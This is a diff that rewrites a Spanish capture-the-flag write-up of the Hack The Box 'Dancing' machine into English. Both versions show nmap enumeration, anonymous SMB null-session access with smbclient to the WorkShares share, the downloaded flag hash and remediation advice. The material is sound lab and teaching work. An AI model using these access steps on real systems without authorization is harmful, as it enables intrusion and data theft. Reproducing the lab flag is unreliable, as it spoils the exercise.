@@ -1,73 +1,37 @@
----
-categories:
-  - "[[Ciber]]"
-tags:
-  - vms
-  - pentesting
-  - starting-point
-created: 2026-02-15
----
-## 1. Información General
+# Dancing
 
-- **Máquina:** Dancing
+**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Windows · **Difficulty:** Tier 0
 
-- **IP:** 10.129.9.24
+**Summary:** SMB allowed a null session. That gave anonymous access to an internal share (`WorkShares`) and to the user files in it.
 
-- **SO:** Windows
+## 1. Reconnaissance
 
-- **Dificultad:** Muy facil
+- **Command:** `nmap -sC -sV 10.129.9.24`
+- **Open ports:**
 
-- **Fecha:** 15/02/2026
-    
+| **Port** | **Service**   | **Version**                   | **State** |
+| -------- | ------------- | ----------------------------- | --------- |
+| 135      | msrpc         | Windows RPC                   | Open      |
+| 139      | netbios-ssn   | Windows netbios-ssn           | Open      |
+| 445      | microsotf-ds? | SMB                           | Open      |
+| 5985     | http          | HTTPAPI httpd 2.0 (SSDP/UPnP) | Open      |
 
-## 2. Resumen Ejecutivo
+- **Services:** Microsoft Windows SMB (139, 445), WinRM/HTTPAPI 2.0 (5985), RPC (135).
+- **Key findings:**
+  1. Nmap's `smb2-security-mode` script shows SMB 3.1.1 with message signing enabled but not required.
+  2. Listing shares with `smbclient -L` reveals a non-standard share, `WorkShares`, readable through a null session with no credentials.
 
-Se comprometió el servidor Windows explotando una configuración insegura en el servicio SMB (Null Session). Esta brecha permitió el acceso de red anónimo y no autenticado a un recurso compartido interno (`WorkShares`), derivando en la exposición y extracción no autorizada de información confidencial de los usuarios.
+## 2. Foothold
 
-## 3. Enumeración (Reconocimiento)
+- **Vulnerability:** unauthenticated access to SMB shares (null session / guest access).
+- **Reference:** MITRE ATT&CK T1021.002 (SMB/Windows Admin Shares).
 
-### 3.1 Escaneo de Red
+Steps:
+1. Connect to the share with a blank login (press Enter at the password prompt): `smbclient //10.129.9.24/WorkShares`
+2. Browse the exposed user folders: `ls` -> `cd James.P`
+3. Download the file: `get flag.txt`
 
-- **Comando utilizado:** `nmap -sC -sV 10.129.9.24`
-    
-- **Puertos Abiertos:**
-    
-
-| **Puerto** | **Servicio**  | **Versión**                   | **Estado** |
-| ---------- | ------------- | ----------------------------- | ---------- |
-| 135        | msrpc         | Windows RPC                   | Abierto    |
-| 139        | netbios-ssn   | Windows netbios-ssn           | Abierto    |
-| 445        | microsotf-ds? | SMB                           | Abierto    |
-| 5985       | http          | HTTPAPI httpd 2.0 (SSDP/UPnP) | Abierto    |
-
-### 3.2 Análisis de Servicios
-
-- **Tecnologías Detectadas:** Microsoft Windows SMB (Puertos 139, 445), WinRM/HTTPAPI 2.0 (Puerto 5985), RPC (Puerto 135)
-
-- **Hallazgos Clave:** El script `smb2-security-mode` de Nmap revela que la versión del protocolo es SMB 3.1.1 y que la firma de mensajes está habilitada pero no es requerida. 2. Mediante enumeración de recursos compartidos (`smbclient -L`), se descubrió un recurso no estándar llamado `WorkShares` accesible de forma anónima (Null Session) sin requerir credenciales válidas.
-    
-
-## 4. Análisis de Vulnerabilidades
-
-- **Vulnerabilidad Principal:** Acceso anónimo no autenticado a recursos compartidos SMB (SMB Null Session / Guest Access)
-
-- **Referencia:** Mitre ATT&CK T1021.002 (SMB/Windows Admin Shares)
-    
-
-## 5. Explotación (Gaining Access)
-
-- **Razonamiento:** Aprovechar la mala configuración de permisos en el recurso compartido `WorkShares` para acceder directamente al sistema de archivos mediante una sesión nula.
-    
-- **Pasos de Reproducción:**
-    
-    1. Iniciar conexión al recurso compartido forzando un inicio de sesión en blanco (pulsando Enter al pedir contraseña): `smbclient //10.129.9.24/WorkShares`
-        
-    2. - Navegar por los directorios internos de los usuarios expuestos: `ls` -> `cd James.P`
-    
-	3. Descargar el archivo confidencial encontrado: `get flag.txt`
-        
-- **Evidencia:**
-    
+```
     ┌──(julicc㉿diavlo)-[~]
 	└─$ smbclient //10.129.9.24/WorkShares
 	Password for WORKGROUP\julicc:
@@ -86,20 +50,20 @@ Se comprometió el servidor Windows explotando una configuración insegura en el
 	┌──(julicc㉿diavlo)-[~]
 	└─$ cat flag.txt 
 	035db21c881520061c53e0536e44f815
-	
+```
 
-## 6. Post-Explotación (Escalada de Privilegios)
-    
-- **Prueba de Compromiso (Flags):**
-        
-    - 🚩 **Root Flag:** `035db21c881520061c53e0536e44f815`
+## 3. Privilege Escalation
 
-## 7. Remediación y Conclusiones
+Not applicable: the flag sits in the open share.
 
-- **Criticidad:** Alta
-    
-- **Recomendaciones:**
-    
-    1. - **Control de Acceso:** Deshabilitar las sesiones nulas (Null Sessions) y el acceso a la cuenta "Invitado" (Guest) en la configuración de directivas locales de Windows Server.
-    
-	2. **Permisos NTFS y de Recurso Compartido:** Asegurar que el recurso `WorkShares` tenga permisos explícitos de lectura/escritura únicamente para los grupos de usuarios de dominio autorizados (ej. `Domain Users`), eliminando al grupo `Todos` (Everyone).
+- 🚩 **Flag:** `035db21c881520061c53e0536e44f815`
+
+## 4. Conclusion
+
+**Severity:** High
+
+**Chain:** SMB null session → readable `WorkShares` share → user data exposed.
+
+**Remediation:**
+1. **Access control:** disable null sessions and the Guest account in Windows Server local policy.
+2. **Share and NTFS permissions:** grant read/write on `WorkShares` only to authorized groups (e.g. `Domain Users`) and remove `Everyone`.
